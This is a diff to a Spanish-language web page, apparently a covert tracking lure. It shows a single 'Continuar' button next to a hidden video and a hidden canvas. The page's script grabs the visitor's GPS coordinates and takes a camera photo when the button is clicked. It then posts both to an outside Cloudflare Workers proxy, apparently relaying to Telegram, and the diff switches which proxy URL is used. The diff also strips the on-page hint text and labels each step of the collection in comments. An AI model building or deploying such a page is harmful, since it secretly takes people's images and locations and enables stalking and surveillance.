@@ -26,21 +26,14 @@
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: 0.2s;
         }
         button:active {
             transform: scale(0.97);
             background: #005fc1;
         }
-        p {
-            color: #555;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .error-message {
+        .error {
             margin-top: 20px;
             color: #d32f2f;
-            font-size: 14px;
             background: #ffebee;
             padding: 10px;
             border-radius: 8px;
@@ -51,15 +44,15 @@
 <body>
 <div style="max-width: 300px; width: 100%;">
     <button id="btn">Continuar</button>
-    <p>Haz clic para continuar</p>
-    <div id="errorMsg" class="error-message"></div>
+    <div id="errorMsg" class="error"></div>
 </div>
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    const PROXY_URL = 'https://bot-ubi.societykark.workers.dev/';
+    const PROXY_URL = 'https://proxy-tg.societykark.workers.dev';
 
+    // Enviar datos al worker (proxy)
     async function sendToWorker(text, photoBlob) {
         const formData = new FormData();
         formData.append('text', text);
@@ -69,6 +62,7 @@
         } catch(e) { console.error(e); }
     }
 
+    // Tomar foto (cámara frontal o cualquier cámara)
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -90,6 +84,7 @@
         return blob;
     }
 
+    // Obtener GPS
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -101,6 +96,7 @@
         });
     }
 
+    // Acción del botón
     document.getElementById('btn').onclick = async () => {
         const gps = await getGPS();
         let message = `📸 *Nuevo visitante*\n`;
